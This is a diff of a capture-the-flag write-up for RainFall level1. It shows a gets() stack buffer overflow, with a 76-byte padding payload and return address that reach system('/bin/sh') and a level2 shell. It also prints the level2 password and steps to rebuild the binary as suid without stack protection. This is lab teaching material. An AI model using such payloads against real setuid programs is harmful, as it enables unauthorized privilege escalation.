@@ -40,7 +40,6 @@ We can see here the binary calls the C function ```gets```, which copies a strin
 Let's see if we can cause a buffer overflow. A buffer overflow allows us to change the flow of execution of the program.
 ```
 level1@RainFall:~$ python -c 'print "a"*76' | ./level1
-level1@RainFall:~$ perl -E "print '*' x 76" | ./level1
 Illegal instruction (core dumped)
 ```
 So we've effectively triggered a stack overflow here.
@@ -56,12 +55,11 @@ level1@RainFall:~$  objdump -d -M intel level1
 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
 ```
 Here we find a run command and ```system()``` call that we can exploit. 
-If we run system("/bin/sh"), it will launch a shell that will run with the same priveleges as the calling program. 
-https://stackoverflow.com/questions/43294227/hijacking-system-bin-sh-to-run-arbitrary-commands
+If we run system("/bin/sh"), [it will launch a shell](https://stackoverflow.com/questions/43294227/hijacking-system-bin-sh-to-run-arbitrary-commands) that will run with the same priveleges as the calling program. 
+
 
 ```
 level1@RainFall:~$ (python -c 'print "a"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
-level1@RainFall:~$ (perl -e 'print "a" x 76 . "\x44\x84\x04\x08"' ; cat -) | ./level1
 Good... Wait what?
 whoami
 level2
@@ -71,3 +69,20 @@ cat /home/user/level2/.pass
 So the password for level2 is ```53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77```!
 
 ## Recreate Exploited Binary
+
+As user level2, create source.c, then compile in /tmp/.
+```
+level2@RainFall: cd /tmp
+level2@RainFall: gcc level1_source.c -fno-stack-protector -o level1_source
+```
+Edit permissions including suid, then move the binary to home directory.
+```
+level2@RainFall: chmod u+s level1_ source
+level2@RainFall: chmod +wx ~; mv level1_source ~
+```
+Exit back to user level1, then run the binary.
+```
+level2@RainFall:~$ exit
+exit
+level1@RainFall:~$ (python -c 'print "a"*76 + "\x44\x84\x04\x08"'; cat) | /home/user/level1/level1_source
+```
